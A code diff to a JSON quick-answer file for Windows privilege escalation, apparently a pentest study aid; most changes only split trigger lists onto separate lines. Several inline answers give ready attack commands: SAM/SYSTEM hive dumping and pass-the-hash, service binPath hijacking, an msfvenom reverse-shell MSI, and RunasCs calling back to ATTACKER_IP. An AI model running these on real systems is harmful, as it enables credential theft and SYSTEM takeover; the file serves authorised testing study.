@@ -1,7 +1,14 @@
 [
   {
     "slug": "whoami-priv-windows",
-    "triggers": ["whoami priv", "what privileges matter", "token privileges", "windows privs", "whoami /priv", "which privilege"],
+    "triggers": [
+      "whoami priv",
+      "what privileges matter",
+      "token privileges",
+      "windows privs",
+      "whoami /priv",
+      "which privilege"
+    ],
     "title": "whoami /priv — which token privileges matter",
     "answer_type": "inline",
     "inline_answer": "```\nwhoami /priv\nwhoami /groups\n```\n\nActionable if **Enabled** (or present — most can be re-enabled): **SeImpersonate / SeAssignPrimaryToken** → Potato → SYSTEM. **SeBackup / SeRestore** → dump SAM/SYSTEM. **SeDebug** → LSASS / inject SYSTEM. **SeTakeOwnership** → own a SYSTEM file. **SeLoadDriver** → vulnerable driver. **SeManageVolume** → arbitrary write. Backup Operators / Server Operators groups = same as SeBackup / service control.",
@@ -11,7 +18,14 @@
   },
   {
     "slug": "potato-which-one",
-    "triggers": ["which potato", "potato decision", "printspoofer or godpotato", "potato variant", "seimpersonate which tool", "potato"],
+    "triggers": [
+      "which potato",
+      "potato decision",
+      "printspoofer or godpotato",
+      "potato variant",
+      "seimpersonate which tool",
+      "potato"
+    ],
     "title": "Which Potato? (SeImpersonate → SYSTEM)",
     "answer_type": "inline",
     "inline_answer": "Order to try:\n\n1. **SigmaPotato** — broadest, modern .NET, try first.\n2. **PrintSpoofer** — Win10 / Server 2016–2019, clean and reliable.\n3. **GodPotato** — very broad version support, good fallback.\n4. **JuicyPotato** — only Win7/8/Server 2008–2012 (CLSID-based; dead on modern).\n\nIf `whoami /priv` lacks SeImpersonate on a service account → **FullPowers** to restore it first.",
@@ -21,7 +35,14 @@
   },
   {
     "slug": "sebackupprivilege-dump",
-    "triggers": ["sebackupprivilege", "sebackup", "backup operators", "dump sam sebackup", "sebackup privesc", "serestore"],
+    "triggers": [
+      "sebackupprivilege",
+      "sebackup",
+      "backup operators",
+      "dump sam sebackup",
+      "sebackup privesc",
+      "serestore"
+    ],
     "title": "SeBackupPrivilege → dump SAM/SYSTEM",
     "answer_type": "inline",
     "inline_answer": "```\nreg save HKLM\\SAM sam.hive\nreg save HKLM\\SYSTEM system.hive\n# if reg save is blocked: diskshadow script + robocopy /b\n```\n\nExfil both, then on Kali: `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`. PtH the local Administrator NT hash.",
@@ -31,7 +52,14 @@
   },
   {
     "slug": "service-binary-hijack",
-    "triggers": ["service binary hijack", "sc config binpath", "writable service", "service privesc", "weak service permissions", "accesschk service"],
+    "triggers": [
+      "service binary hijack",
+      "sc config binpath",
+      "writable service",
+      "service privesc",
+      "weak service permissions",
+      "accesschk service"
+    ],
     "title": "Service hijack — weak perms / writable binary",
     "answer_type": "inline",
     "inline_answer": "```\n# permissions on the service object\naccesschk.exe -uwcqv user *        (or PowerUp Get-ModifiableService)\nsc qc <svc>                        # check BINARY_PATH_NAME + start type\n# SERVICE_CHANGE_CONFIG / ALL_ACCESS:\nsc config <svc> binPath= \"C:\\Windows\\Temp\\rev.exe\" && sc stop <svc> && sc start <svc>\n# or just replace a writable service binary, then restart / reboot\n```",
@@ -41,7 +69,12 @@
   },
   {
     "slug": "unquoted-service-path",
-    "triggers": ["unquoted service path", "unquoted path", "space in service path", "unquoted privesc"],
+    "triggers": [
+      "unquoted service path",
+      "unquoted path",
+      "space in service path",
+      "unquoted privesc"
+    ],
     "title": "Unquoted service path",
     "answer_type": "inline",
     "inline_answer": "```\nwmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\\\"'\n```\n\nPath like `C:\\Program Files\\Some App\\svc.exe` with a writable earlier directory → drop payload as `C:\\Program.exe` or `C:\\Program Files\\Some.exe` (the gap before the first space). Restart the service.",
@@ -51,7 +84,12 @@
   },
   {
     "slug": "alwaysinstallelevated",
-    "triggers": ["alwaysinstallelevated", "always install elevated", "msi privesc", "always install elevated msi"],
+    "triggers": [
+      "alwaysinstallelevated",
+      "always install elevated",
+      "msi privesc",
+      "always install elevated msi"
+    ],
     "title": "AlwaysInstallElevated",
     "answer_type": "inline",
     "inline_answer": "**Both** keys must be `0x1`:\n\n```\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n```\n\n```\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=.. LPORT=.. -f msi -o e.msi\nmsiexec /quiet /qn /i C:\\Windows\\Temp\\e.msi\n```",
@@ -61,7 +99,14 @@
   },
   {
     "slug": "runas-another-user",
-    "triggers": ["runas", "runascs", "run as another user", "switch user windows", "have creds windows", "use creds windows"],
+    "triggers": [
+      "runas",
+      "runascs",
+      "run as another user",
+      "switch user windows",
+      "have creds windows",
+      "use creds windows"
+    ],
     "title": "RunasCs — run as another user",
     "answer_type": "inline",
     "inline_answer": "Have a username+password but no shell as them (no RDP/WinRM)?\n\n```\nRunasCs.exe USER PASS cmd.exe -r ATTACKER_IP:PORT\nRunasCs.exe USER PASS \"powershell -e <b64>\" --bypass-uac -l 5\n```\n\n`-l 5` (service) or `-l 2` (interactive) logon type if the default fails. Catch with Penelope.",
@@ -71,7 +116,14 @@
   },
   {
     "slug": "windows-cross-compile",
-    "triggers": ["cross compile windows", "mingw", "compile exe kali", "compile dll", "x86_64-w64-mingw32", "build windows exploit"],
+    "triggers": [
+      "cross compile windows",
+      "mingw",
+      "compile exe kali",
+      "compile dll",
+      "x86_64-w64-mingw32",
+      "build windows exploit"
+    ],
     "title": "Cross-compile for Windows on Kali",
     "answer_type": "inline",
     "inline_answer": "```\n# EXE (64-bit)\nx86_64-w64-mingw32-gcc x.c -o x.exe\n# DLL (64-bit)\nx86_64-w64-mingw32-gcc x.c -shared -o x.dll\n# 32-bit\ni686-w64-mingw32-gcc x.c -o x.exe\n```\n\nMissing? `apt install gcc-mingw-w64`. For C# use `mcs` / build on a Windows VM.",
@@ -81,7 +133,13 @@
   },
   {
     "slug": "windows-privesc-workflow",
-    "triggers": ["windows privesc", "windows privesc workflow", "how to privesc windows", "windows priv esc start", "escalate windows"],
+    "triggers": [
+      "windows privesc",
+      "windows privesc workflow",
+      "how to privesc windows",
+      "windows priv esc start",
+      "escalate windows"
+    ],
     "title": "Windows privesc — workflow (start here)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#workflow-start-here",
@@ -90,16 +148,27 @@
   },
   {
     "slug": "windows-high-roi",
-    "triggers": ["windows high roi", "common windows privesc", "windows engagement failures", "windows privesc patterns", "windows privesc priority"],
+    "triggers": [
+      "windows high roi",
+      "common windows privesc",
+      "windows engagement failures",
+      "windows privesc patterns",
+      "windows privesc priority"
+    ],
     "title": "High-ROI Windows privesc patterns",
     "answer_type": "chunk_ref",
-    "target_chunk_id": "BUS_REVIEW/OffSec_PrivEsc_Mental_Model.md#high-roi-windows-patterns-these-cause-engagement-failures",
+    "target_chunk_id": null,
     "tags": "windows privesc methodology",
     "priority": 180
   },
   {
     "slug": "windows-privesc-stuck",
-    "triggers": ["windows privesc stuck", "nothing works windows", "windows privesc failure", "windows escalation stuck"],
+    "triggers": [
+      "windows privesc stuck",
+      "nothing works windows",
+      "windows privesc failure",
+      "windows escalation stuck"
+    ],
     "title": "Windows privesc — failure branch (stuck)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#17-failure-branch-when-nothing-works",
@@ -108,7 +177,13 @@
   },
   {
     "slug": "dll-hijacking",
-    "triggers": ["dll hijack", "dll hijacking", "missing dll", "dll search order", "phantom dll"],
+    "triggers": [
+      "dll hijack",
+      "dll hijacking",
+      "missing dll",
+      "dll search order",
+      "phantom dll"
+    ],
     "title": "DLL hijacking",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#6-dll-hijacking",
@@ -117,7 +192,12 @@
   },
   {
     "slug": "scheduled-task-abuse",
-    "triggers": ["scheduled task privesc", "schtasks abuse", "writable scheduled task", "scheduled task privesc windows"],
+    "triggers": [
+      "scheduled task privesc",
+      "schtasks abuse",
+      "writable scheduled task",
+      "scheduled task privesc windows"
+    ],
     "title": "Scheduled task abuse",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#7-scheduled-tasks",
@@ -126,7 +206,13 @@
   },
   {
     "slug": "uac-bypass",
-    "triggers": ["uac bypass", "fodhelper", "bypass uac", "high integrity", "medium to high integrity"],
+    "triggers": [
+      "uac bypass",
+      "fodhelper",
+      "bypass uac",
+      "high integrity",
+      "medium to high integrity"
+    ],
     "title": "UAC bypass",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#12-uac-bypass",
@@ -135,7 +221,13 @@
   },
   {
     "slug": "windows-cred-hunt-privesc",
-    "triggers": ["windows privesc creds", "unattend xml", "powershell history privesc", "windows stored creds", "cmdkey runas"],
+    "triggers": [
+      "windows privesc creds",
+      "unattend xml",
+      "powershell history privesc",
+      "windows stored creds",
+      "cmdkey runas"
+    ],
     "title": "Credential hunting for privesc (Windows)",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#3-credential-hunting",
@@ -144,7 +236,13 @@
   },
   {
     "slug": "seloaddriver",
-    "triggers": ["seloaddriverprivilege", "seloaddriver", "load driver privesc", "capcom driver", "vulnerable driver privesc"],
+    "triggers": [
+      "seloaddriverprivilege",
+      "seloaddriver",
+      "load driver privesc",
+      "capcom driver",
+      "vulnerable driver privesc"
+    ],
     "title": "SeLoadDriverPrivilege",
     "answer_type": "chunk_ref",
     "target_chunk_id": "Checklists/Windows_PrivEsc_Checklist_Methodology.md#2-6-seloaddriverprivilege",
@@ -153,7 +251,12 @@
   },
   {
     "slug": "semanagevolume",
-    "triggers": ["semanagevolumeprivilege", "semanagevolume", "arbitrary write system", "manage volume privesc"],
+    "triggers": [
+      "semanagevolumeprivilege",
+      "semanagevolume",
+      "arbitrary write system",
+      "manage volume privesc"
+    ],
     "title": "SeManageVolumePrivilege → arbitrary write → SYSTEM",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#8-semanagevolumeprivilege-arbitrary-write-system",
@@ -162,7 +265,13 @@
   },
   {
     "slug": "fullpowers",
-    "triggers": ["fullpowers", "restore privileges", "service account no seimpersonate", "missing privileges", "get seimpersonate back"],
+    "triggers": [
+      "fullpowers",
+      "restore privileges",
+      "service account no seimpersonate",
+      "missing privileges",
+      "get seimpersonate back"
+    ],
     "title": "FullPowers — restore missing service privileges",
     "answer_type": "chunk_ref",
     "target_chunk_id": "_CHEATSHEETS/Windows_PrivEsc.md#8-fullpowers-restore-missing-privileges",
